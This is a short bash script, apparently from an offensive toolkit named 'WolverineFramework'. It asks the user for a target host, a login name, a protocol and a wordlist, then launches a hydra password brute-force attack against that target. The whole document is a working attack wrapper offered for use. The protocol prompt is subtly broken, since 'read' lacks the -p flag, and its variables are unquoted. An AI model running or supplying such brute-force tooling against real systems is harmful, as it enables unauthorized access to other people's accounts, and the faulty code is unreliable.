#!/bin/bash


echo "What is the IP or the hostname of your target ?"
read -p "WolverineFramework - IP> " IP
echo "What is the session name of your target ?"
read -p "WolverineFramework - Session> " Session
echo "What is the protocol targetted ?"
read "WolverineFramework - Protocol> " protocol
echo "Here are your Wordlists"
echo "=========================================="
echo ""
ls Wordlists/
echo ""
echo "=========================================="
echo "Which wordlist do you want to use (don't forget filename extension !) ?"
read -p "WolverineFramework - Wordlist> " Wordlist
sudo hydra -l $Session -P Wordlists/$Wordlist $IP -t 6 $protocol
